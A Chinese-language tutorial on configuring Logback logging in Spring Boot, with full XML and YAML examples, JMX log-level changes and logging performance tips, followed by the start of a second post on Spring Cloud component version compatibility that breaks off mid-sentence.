123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- 日志级别从低到高分为TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL，如果设置为WARN，则低于WARN的信息都不会输出 --&gt;&lt;!-- scan:当此属性设置为true时，配置文件如果发生改变，将会被重新加载，默认值为true --&gt;&lt;!-- scanPeriod:设置监测配置文件是否有修改的时间间隔，如果没有给出时间单位，默认单位是毫秒。当scan为true时，此属性生效。默认的时间间隔为1分钟。 --&gt;&lt;!-- debug:当此属性设置为true时，将打印出logback内部日志信息，实时查看logback运行状态。默认值为false。 --&gt;&lt;configuration scan="true" scanPeriod="60 seconds" debug="false"&gt; &lt;!-- 日志上下文名称--&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;!-- 日志文件的目录路径--&gt; &lt;property name="log.path" value="/tmp/log/pricing/eureka" /&gt; &lt;!-- 彩色日志依赖的渲染类与彩色日志格式 --&gt; &lt;conversionRule conversionWord="clr" converterClass="org.springframework.boot.logging.logback.ColorConverter" /&gt; &lt;conversionRule conversionWord="wex" converterClass="org.springframework.boot.logging.logback.WhitespaceThrowableProxyConverter" /&gt; &lt;conversionRule conversionWord="wEx" converterClass="org.springframework.boot.logging.logback.ExtendedWhitespaceThrowableProxyConverter" /&gt; &lt;property name="CONSOLE_LOG_PATTERN" value="${CONSOLE_LOG_PATTERN:-%clr(%d{yyyy-MM-dd HH:mm:ss.SSS}){faint} %clr(${LOG_LEVEL_PATTERN:-%5p}) %clr(${PID:- }){magenta} %clr(---){faint} %clr([%15.15t]){faint} %clr(%-40.40logger{39}){cyan} %clr(:){faint} %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}"/&gt; &lt;!--输出到控制台--&gt; &lt;appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;!--此日志appender是为开发使用，只配置最底级别，控制台输出的日志级别是大于或等于此级别的日志信息--&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;Pattern&gt;${CONSOLE_LOG_PATTERN}&lt;/Pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--输出到日志文件--&gt; &lt;!-- 时间滚动输出level为DEBUG日志 --&gt; &lt;appender name="DEBUG_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_debug.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- 日志归档 --&gt; &lt;fileNamePattern&gt;${log.path}/debug/log-debug-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录DEBUG级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;debug&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为INFO日志 --&gt; &lt;appender name="INFO_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_info.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- 每天日志归档路径以及格式 --&gt; &lt;fileNamePattern&gt;${log.path}/info/log-info-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录INFO级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为WARN日志 --&gt; &lt;appender name="WARN_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_warn.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/warn/log-warn-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录WARN级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;warn&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为ERROR日志 --&gt; &lt;appender name="ERROR_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_error.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/error/log-error-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录ERROR级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- &lt;logger&gt;用来设置某一个包或者具体的某一个类的日志打印级别，以及指定&lt;appender&gt;。&lt;logger&gt;仅有一个name属性，一个可选的level和一个可选的addtivity属性。 name:用来指定受此logger约束的某一个包或者具体的某一个类。 level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF，还有一个特俗值INHERITED或者同义词NULL，代表强制执行上级的级别。如果未设置此属性，那么当前logger将会继承上级的级别。 addtivity:是否向上级logger传递打印信息。默认是true。 &lt;logger name="org.springframework.web" level="info"/&gt; &lt;logger name="org.springframework.scheduling.annotation.ScheduledAnnotationBeanPostProcessor" level="INFO"/&gt; --&gt; &lt;!-- 使用mybatis的时候，sql语句是debug下才会打印，而这里只配置了info，所以想要查看sql语句的话，有以下两种操作： 第一种：把&lt;root level="info"&gt;改成&lt;root level="DEBUG"&gt;这样就会打印sql，不过这样日志那边会出现很多其他消息 第二种：就是application.properties中单独给dao下目录配置debug模式，具体配置如下，这样配置sql语句会打印，其他还是正常info级别： logging.level.dao=debug logging.level.org.mybatis=debug --&gt; &lt;!-- root节点是必选节点，用来指定最基础的日志输出级别，只有一个level属性 level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF， 不能设置为INHERITED或者同义词NULL，默认是DEBUG 可以包含零个或多个元素，标识这个appender将会添加到这个logger --&gt; &lt;root level="info"&gt; &lt;appender-ref ref="CONSOLE" /&gt; &lt;appender-ref ref="DEBUG_FILE" /&gt; &lt;appender-ref ref="INFO_FILE" /&gt; &lt;appender-ref ref="WARN_FILE" /&gt; &lt;appender-ref ref="ERROR_FILE" /&gt; &lt;/root&gt; &lt;!--生产环境:输出到文件--&gt; &lt;!-- &lt;springProfile name="pro"&gt; &lt;root level="info"&gt; &lt;appender-ref ref="CONSOLE" /&gt; &lt;appender-ref ref="DEBUG_FILE" /&gt; &lt;appender-ref ref="INFO_FILE" /&gt; &lt;appender-ref ref="ERROR_FILE" /&gt; &lt;appender-ref ref="WARN_FILE" /&gt; &lt;/root&gt; &lt;/springProfile&gt; --&gt; &lt;!--开发环境:打印控制台--&gt; &lt;!-- &lt;springProfile name="dev"&gt; &lt;logger name="com.nmys.view" level="debug"/&gt; &lt;/springProfile&gt; --&gt;&lt;/configuration&gt; 123&lt;springProfile name="dev"&gt; &lt;logger name="com.nmys.view" level="debug"/&gt;&lt;/springProfile&gt; 上面这段配置内容也可以直接在 YML 里面配置，如下： 123logging: level: com.nmys.view: debug 完整的 YML 配置内容如下： 1234logging: level: com.nmys.view: debug config: classpath:logback/logback-spring.xml JMX 动态修改 Logback 的日志级别 应用上线后常常会面对这样一种困境，即如果把日志级别开得太高，那么当系统出现问题时不好查，如果把日志级别定得太低，那么硬盘很可能很快就被撑爆了。这时候常常选择先将日志级别定高点，当出现问题时，再调低。大部分时候开发者习惯的做法是直接修改 Logback 的配置文件，然后重启应用。这样做当然有问题，应用跑得好好的，用户用着好好的，为什么要重启呢？谁来应对重启时客户的怒火呢？Logback 的开发者想得很周到，默认为用户提供了一种动态修改日志级别的能力，而不需要手动重启应用。配置方式很简单，只需在 Logback 的配置文件中添加以下一行内容即可： 123&lt;configuration&gt; &lt;jmxConfigurator/&gt;&lt;/configuration&gt; IDEA 彩色日志插件 上述的彩色日志需要依赖 IDEA 里的 Grep Console 插件： 日志代码性能优化 这里再说下日志输出代码，一般有人可能在代码中使用如下方式输出： 12Object entry = new SomeObject();logger.debug("The entry is " + entry); 上面看起来没什么问题，但是会存在构造消息参数的成本，即将 entry 转换成字符串相加。并且无论是否记录消息，都是如此，即那怕日志级别为 INFO，也会执行括号里面的操作，但是日志不会输出，下面是优化后的写法： 1234if(logger.isDebugEnabled()) { Object entry = new SomeObject(); logger.debug("The entry is " + entry);} 上面的写法首先对设置的日志级别进行了判断，如果为 DEBUG 日志级别，才进行参数的构造，对第一种写法进行了改善。不过还有最好的写法，使用占位符： 12Object entry = new SomeObject();logger.debug("The entry is {}.", entry); 只有在评估是否记录之后，并且在决策是肯定的情况下，记录器实现才会格式化消息并将 {} 对替换为条目的字符串值。换句话说，当禁用日志语句时，此代码不会产生参数构造的成本。Logback 作者进行测试得出：第一种和第三种写法将产生完全相同的输出。但是，在禁用日志记录的情况下，第三个变体将比第一个变体优于至少 30 倍性能。 如果有多个参数，写法如下： 1logger.debug("The new entry is {}. It replaces {}.", entry, oldEntry); 如果需要传递三个或更多参数，则还可以使用 Object [] 变体： 12Object[] paramArray = {newVal, below, above};logger.debug("Value {} was inserted between {} and {}.", paramArray); 记录日志的时候可能需要在文件中记录下异常的堆栈信息，经过测试，logger.error(e) 可能不会打印出堆栈信息，正确的写法是： 1logger.error("程序异常, 详细信息:{}", e.getLocalizedMessage(), e); MyBatis Plus 打印 SQL 日志 在 MyBatis-Plus 的配置中，加入 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl 即可 1234mybatis-plus: mapper-locations: classpath:/mapper/*.xml configuration: log-impl: org.apache.ibatis.logging.stdout.StdOutImpl 企业项目开发配置实例 ★展开配置内容★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- 日志级别从低到高分为TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL，如果设置为WARN，则低于WARN的信息都不会输出 --&gt;&lt;!-- scan:当此属性设置为true时，配置文件如果发生改变，将会被重新加载，默认值为true --&gt;&lt;!-- scanPeriod:设置监测配置文件是否有修改的时间间隔，如果没有给出时间单位，默认单位是毫秒。当scan为true时，此属性生效。默认的时间间隔为1分钟。 --&gt;&lt;!-- debug:当此属性设置为true时，将打印出logback内部日志信息，实时查看logback运行状态。默认值为false。 --&gt;&lt;configuration scan="true" scanPeriod="60 seconds" debug="false"&gt; &lt;!-- JMX 支持--&gt; &lt;jmxConfigurator/&gt; &lt;!-- 日志上下文名称--&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;!-- 日志文件的目录路径--&gt; &lt;property name="log.path" value="/tmp/log/pricing/eureka" /&gt; &lt;!-- 彩色日志依赖的渲染类与彩色日志格式 --&gt; &lt;conversionRule conversionWord="clr" converterClass="org.springframework.boot.logging.logback.ColorConverter" /&gt; &lt;conversionRule conversionWord="wex" converterClass="org.springframework.boot.logging.logback.WhitespaceThrowableProxyConverter" /&gt; &lt;conversionRule conversionWord="wEx" converterClass="org.springframework.boot.logging.logback.ExtendedWhitespaceThrowableProxyConverter" /&gt; &lt;property name="CONSOLE_LOG_PATTERN" value="${CONSOLE_LOG_PATTERN:-%clr(%d{yyyy-MM-dd HH:mm:ss.SSS}){faint} %clr(${LOG_LEVEL_PATTERN:-%5p}) %clr(${PID:- }){magenta} %clr(---){faint} %clr([%15.15t]){faint} %clr(%-40.40logger{39}){cyan} %clr(:){faint} %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}"/&gt; &lt;!--输出到控制台--&gt; &lt;appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;!--此日志appender是为开发使用，只配置最底级别，控制台输出的日志级别是大于或等于此级别的日志信息--&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;Pattern&gt;${CONSOLE_LOG_PATTERN}&lt;/Pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--输出到日志文件--&gt; &lt;!-- 时间滚动输出level为DEBUG日志 --&gt; &lt;appender name="DEBUG_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_debug.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- 日志归档 --&gt; &lt;fileNamePattern&gt;${log.path}/debug/log-debug-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录DEBUG级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;debug&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为INFO日志 --&gt; &lt;appender name="INFO_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_info.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- 每天日志归档路径以及格式 --&gt; &lt;fileNamePattern&gt;${log.path}/info/log-info-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录INFO级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为WARN日志 --&gt; &lt;appender name="WARN_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_warn.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/warn/log-warn-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录WARN级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;warn&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为ERROR日志 --&gt; &lt;appender name="ERROR_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_error.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/error/log-error-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录ERROR级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;root level="info"&gt; &lt;appender-ref ref="CONSOLE" /&gt; &lt;appender-ref ref="DEBUG_FILE" /&gt; &lt;appender-ref ref="INFO_FILE" /&gt; &lt;appender-ref ref="WARN_FILE" /&gt; &lt;appender-ref ref="ERROR_FILE" /&gt; &lt;/root&gt;&lt;/configuration&gt; 1234logging: level: com.nmys.view: debug config: classpath:logback/logback-spring.xml 参考资料 Spring Boot 整合 Logback 日志框架 Spring Boot 2.0 整合 Logback 日志框架 Spring Boot 使用 Logback 日志框架超详细教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"SpringCloud 各组件的版本说明（持续更新）",url:"/posts/88441946.html",text:'Spring BootSpring Boot 版本截止 2022 年 9 月 22 日，Spring Boot 的最新版本为 2.7.3，最新的版本信息可以查阅以下网站来获取： Maven 中央仓库 Spring Boot 官方文档 Spring Boot 2.0 官方发布日志 Spring CloudSpring Cloud 版本截止 2022 年 9 月 22 日，Spring Cloud 的最新版本为 2021.0.4，最新的版本信息可以查阅以下网站来获取： Maven 中央仓库 Spring Cloud 官方文档 SpringBoot 版本的对应关系 Spring Cloud Version Spring Boot Version 2021.0.x aka Jubilee 2.6.x, 2.7.x (Starting with 2021.0.3) 2020.0.x aka Ilford 2.4.x, 2.5.x (Starting with 2020.0.3) Hoxton 2.2.x, 2.3.x (Starting with SR5) Greenwich 2.1.x Finchley 2.0.x Edgware 1.5.x Dalston 1.5.x Spring Cloud Alibaba由于 Spring Boot 2.4+ 和以下版本之间的变化较大，目前企业级客户老项目相关 Spring Boot 版本仍停留在 Spring Boot 2.4 以下，为了同时满足存量用户和新用户不同需求，社区以 Spring Boot 2.4 为分界线，同时维护 Spring Cloud Alibaba 2.2.x 和 2021.x 两个分支的迭代。 提示 Spring Cloud 与 Spring Cloud Alibaba 最新的版本对应关系请看 GitHub Wiki。 2.2.x 分支适配 Spring Boot 2.4、Spring Cloud Hoxton 及以下的版本，Spring Cloud Alibaba 各版本的对应关系如下表所示（最新版本用 * 标记） Spring Cloud Alibaba Version Spring Cloud Version Spring Boot Version 2.2.9.RELEASE * Hoxton.SR12 2.3.12.RELEASE 2.2.8.RELEASE Hoxton.SR12 2.3.12.RELEASE 2.2.7.RELEASE Hoxton.SR12 2.3.12.RELEASE 2.2.6.RELEASE Hoxton.SR9 2.3.2.RELEASE 2.1.4.RELEASE Greenwich.SR6 2.1.13.RELEASE 2.2.1.RELEASE Hoxton.SR3 2.2.5.RELEASE 2.2.0.RELEASE Hoxton.RELEASE 2.2.X.RELEASE 2.1.2.RELEASE Greenwich 2.1.X.RELEASE 2.0.4.RELEASE (停止维护，建议升级) Finchley 2.0.X.RELEASE 1.5.1.RELEASE (停止维护，建议升级) Edgware 1.5.X.RELEASE 2021.x 分支适配 Spring Boot 2.4、Spring Cloud 2021.x 及以上的版本，Spring Cloud Alibaba 各版本的对应关系如下表所示（最新版本用 * 标记）。特别注意，该分支的 Spring Cloud Alibaba 版本命名方式进行了调整，未来将对应 Spring Cloud 版本，前三位为 Spring Cloud 版本，最后一位为扩展版本；比如适配 Spring Cloud 2021.0.1 版本对应的 Spring Cloud Alibaba 第一个版本为 2021.0.1.0，第个二版本为 2021.0.1.1，依此类推。 Spring Cloud Alibaba Version Spring Cloud Version Spring Boot Version 2021.0.4.0 * 2021.0.4 2.6.11 2021.0.1.0 2021.0.1 2.6.3 2021.1 2020.0.1 2.4.2 Alibaba 各组件之间的版本对应关系每个 Spring Cloud Alibaba 组件的版本，及其自身所适配的各组件的对应版本关系如下表所示： Spring Cloud Alibaba Version Sentinel Version Nacos Version RocketMQ Version Dubbo Version Seata Version 2.2.9.RELEASE 1.8.5 2.1.0 4.9.4 ~ 1.5.2 2021.0.4.0 1.8.5 2.0.4 4.9.4 ~ 1.5.2 2.2.8.RELEASE 1.8.4 2.1.0 4.9.3 ~ 1.5.1 2021.0.1.0 1.8.3 1.4.2 4.9.2 ~ 1.4.2 2.2.7.RELEASE 1.8.1 2.0.3 4.6.1 2.7.13 1.3.0 2.2.6.RELEASE 1.8.1 1.4.2 4.4.0 2.7.8 1.3.0 2021.1 or 2.2.5.RELEASE or 2.1.4.RELEASE or 2.0.4.RELEASE 1.8.0 1.4.1 4.4.0 2.7.8 1.3.0 2.2.3.RELEASE or 2.1.3.RELEASE or 2.0.3.RELEASE 1.8.0 1.3.3 4.4.0 2.7.8 1.3.0 2.2.1.RELEASE or 2.1.2.RELEASE or 2.0.2.RELEASE 1.7.1 1.2.1 4.4.0 2.7.6 1.2.0 2.2.0.RELEASE 1.7.1 1.1.4 4.4.0 2.7.4.1 1.0.0 2.1.1.RELEASE or 2.0.1.RELEASE or 1.5.1.RELEASE 1.7.0 1.1.4 4.4.0 2.7.3 0.9.0 2.1.0.RELEASE or 2.0.0.RELEASE or 1.5.0.RELEASE 1.6.3 1.1.1 4.4.0 2.7.3 0.7.1 Netflix 各组件替代方案Netflix 公司在 2018 年前后宣布其核心组件 Hystrix、Ribbon、Zuul、Archaius 等均进入维护状态。同在 2018 年，Spring Cloud 在其 Roadmap 里就宣布将要终结的一些库 / 版本，其中最重要的就是指 Spring Cloud Netflix 项目进入维护模式，然后计划在 2020 年完全移除。对于 Netflix 的产品，Spring Cloud 只保留了其 Eureka，其他组件全部移除，并给出了相应的替代产品。 替代方案概览 替代方案介绍Zuul 替代方案Netflix 虽然已经在 2018 年 5 月开源了 Zuul 2.x，但由于 Zuul 2.x 在 Spring Cloud Gateway 孵化之前一直跳票发布，而且 Spring Cloud Gateway 目前已经孵化成功，相较于 Zuul 1.x 在功能以及性能上都有明显的提升。Spring 官方推荐使用 Spring Cloud Gateway 替代 Zuul 1.x，因此在 Spring Boot 2.0 以上版本中，并没有对 Zuul 2.0 以上最新高性能版本进行集成，仍然使用 Zuul 1.x 非 Reactor 模式（基于 Servlet 2.5 阻塞架构）的旧版本。 Ribbon 替代方案Spring Cloud OpenFeign 在 Hoxton.M2 RELEASED 版本之后弃用了 Ribbon，使用 Spring Cloud Loadbalancer 作为客户端的负载均衡组件。从 Spring Cloud 2020 版本开始，Spring Cloud 完全弃用了 Ribbon，使用 Spring Cloud Loadbalancer 作为客户端的负载均衡组件。 Hystrix 替代方案Netflix Hystrix 是 Spring Cloud 中最早支持的一种容错方案，在 2018 年 11 月 20 日之后官方已经停止维护，最后一个正式版本为 1.5.18。在 Spring 